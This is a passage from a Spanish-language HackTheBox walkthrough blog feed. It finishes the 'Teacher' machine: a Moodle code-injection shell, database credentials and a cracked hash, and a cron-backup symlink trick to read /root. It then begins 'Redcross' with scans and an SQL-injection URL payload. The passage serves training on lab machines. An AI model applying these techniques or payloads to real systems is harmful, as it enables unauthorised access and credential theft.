&lt;p&gt;Utilizando las credenciales &lt;code&gt;Giovanni&lt;/code&gt; y &lt;code&gt;Th4C00lTheacha#&lt;/code&gt; logramos ingresar a Moodle.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.23.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;evil-teacher---reverse-shell&#34;&gt;Evil Teacher - Reverse Shell&lt;/h2&gt;
&lt;p&gt;Para nuestra version de moodle encontramos una vulnerabilidad que puede injectar codigo, para ello vamos a crear un Quiz en el curso de Algebra y vamos a agregar una formula de matematica la cual nos va a ayudar a inyectar codigo.&lt;/p&gt;
&lt;p&gt;CVE: &lt;a href=&#34;https://blog.ripstech.com/2018/moodle-remote-code-execution/&#34;&gt;https://blog.ripstech.com/2018/moodle-remote-code-execution/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Peek%202019-04-18%2016-49.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell como &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;user---giovanni&#34;&gt;USER - Giovanni&lt;/h2&gt;
&lt;p&gt;Revisamos los archivos de configuracion para posibles contraseñas de base de datos y encontramos las credenciales de una base de datos en el archivo de configuracion de moodle.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.52.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$CFG-&amp;gt;dbtype    = &amp;#39;mariadb&amp;#39;;
$CFG-&amp;gt;dblibrary = &amp;#39;native&amp;#39;;
$CFG-&amp;gt;dbhost    = &amp;#39;localhost&amp;#39;;
$CFG-&amp;gt;dbname    = &amp;#39;moodle&amp;#39;;
$CFG-&amp;gt;dbuser    = &amp;#39;root&amp;#39;;
$CFG-&amp;gt;dbpass    = &amp;#39;Welkom1!&amp;#39;;
$CFG-&amp;gt;prefix    = &amp;#39;mdl_&amp;#39;;
$CFG-&amp;gt;dboptions = array (
  &amp;#39;dbpersist&amp;#39; =&amp;gt; 0,
  &amp;#39;dbport&amp;#39; =&amp;gt; 3306,
  &amp;#39;dbsocket&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,
  &amp;#39;dbcollation&amp;#39; =&amp;gt; &amp;#39;utf8mb4_unicode_ci&amp;#39;,
);
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nos conectamos a la base de datos&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mariadb -u root -p&lt;span class=&#34;s1&#34;&gt;&amp;#39;Welkom1!&amp;#39;&lt;/span&gt; -D moodle
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos una tabla con usuarios y contraseña.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mdl_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mdl_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.56.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Crackeamos la contraseña de Giovanibak en &lt;a href=&#34;https://crackstation.net/&#34;&gt;https://crackstation.net/&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;7a860966115182402ed06375cf0a22af&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; expelled
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2016.59.17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la contraseña con el usuario &lt;code&gt;Giovanni&lt;/code&gt; y obtenemos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.00.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;root---flag&#34;&gt;ROOT - flag&lt;/h2&gt;
&lt;p&gt;Utilizamos pspy para ver los cron que se ejecutan y encontramos un archivo que se ejecuta cada minuto y realiza un backup de la carpeta courses en el directorio de &lt;code&gt;Giovanni&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.08.21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/backup.sh
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /home/giovanni/work&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
tar -czvf tmp/backup_courses.tar.gz courses/*&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; tmp&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
tar -xf backup_courses.tar.gz&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
chmod &lt;span class=&#34;m&#34;&gt;777&lt;/span&gt; * -R&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para obtener nuestra bandera &lt;code&gt;root.txt&lt;/code&gt; vamos a untilizar un &lt;code&gt;symlink&lt;/code&gt; y lo vamos a apuntar hacia el directorio &lt;code&gt;/root/&lt;/code&gt; donde esta nuestra bandera para que el archivo cuando se ejecute comprima lo que esta en &lt;code&gt;/root/&lt;/code&gt; al archivo &lt;code&gt;backup_courses.tar.gz&lt;/code&gt; y poder descomprimirlo, para ello vamos a renombrar courses.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.11.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego de un minuto se crea el archivo &lt;code&gt;backup_courses.tar.gz&lt;/code&gt; lo descomprimimos y obtenemos nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/teacher/Screenshot%20from%202019-04-18%2017.13.04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/teacher/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/teacher/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Redcross</title>
        <link>https://sckull.github.io/posts/redcross/</link>
        <pubDate>Sat, 13 Apr 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 13 Apr 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/redcross/</guid>
        <description>Redcross es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Redcross es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Al realizar el primer escaneo a la maquina obtuvimos lo siguiente y al parecer tiene un subdominio (intra).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;Nmap 7.70 scan initiated Mon Jan &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 18:47:33 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; as: nmap -sC -sV -o tcp 10.10.10.113
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.113
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.22s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http     Apache httpd 2.4.25
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.25 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp open  ssl/http Apache httpd 2.4.25
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.25 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Debian&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to https://intra.redcross.htb/
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;intra.redcross.htb/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Red Cross International/stateOrProvinceName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;NY/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;US
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2018-06-03T19:46:58
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2021-02-27T19:46:58
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   http/1.1
	http/1.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; Lineas de lo mismo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
Service Info: Host: redcross.htb&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Jan 14 19:47:25 2019 -- 1 IP address (1 host up) scanned in 3592.63 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;subdominios&#34;&gt;Subdominios&lt;/h2&gt;
&lt;p&gt;Agregamos el subdominio intra a nuestro archivo local &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;10.10.10.113	redcross.htb intra.redcross.htb 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al visitar intra.redcross.htb nos muestra un login, podemos probar contraseñas comunes o seguir enumerando la pagina, en este caso el usuario:contraseña que encontramos fue: &lt;code&gt;guest:guest&lt;/code&gt;.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER &lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de los directorios y archivos (php,html,txt,pdf,doc) que podrian estar en la pagina, utilizamos el parametro &amp;lsquo;-k&amp;rsquo; saltarnos la verificacion de SSL de la pagina (-k Skip SSL certificate verification).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; -x php,html,txt,pdf,doc
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.0              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : https://intra.redcross.htb/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : php,html,txt,pdf,doc
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/documentation &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/init.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/pages &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Se realizo de la misma manera para el directorio &lt;code&gt;/documentation&lt;/code&gt; y nos encontramos con un documento.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; -x php,html,txt,pdf,doc
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
account-signup.pdf
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/pdf-account-signup.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dice que si queremos un acceso a la plataforma debemos llenar un formulario en &lt;a href=&#34;https://intra.redcross.htb/?page=contact&#34;&gt;https://intra.redcross.htb/?page=contact&lt;/a&gt; con subject &amp;ldquo;credentials&amp;rdquo; y en el cuerpo del formulario la contraseña del usuario que queremos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/credenciales-guest.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/credenciales-temporales-guest.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;sqli&#34;&gt;SQLI&lt;/h2&gt;
&lt;p&gt;Nos logueamos con el usuario y contraseña, al analizar los directorios y paginas, encontramos una vulnerabilidad SQLi en: &lt;code&gt;https://intra.redcross.htb/?o=1&#39;-- -&amp;amp;page=app&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/redcross/vulnerabilidad-sqli-1.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
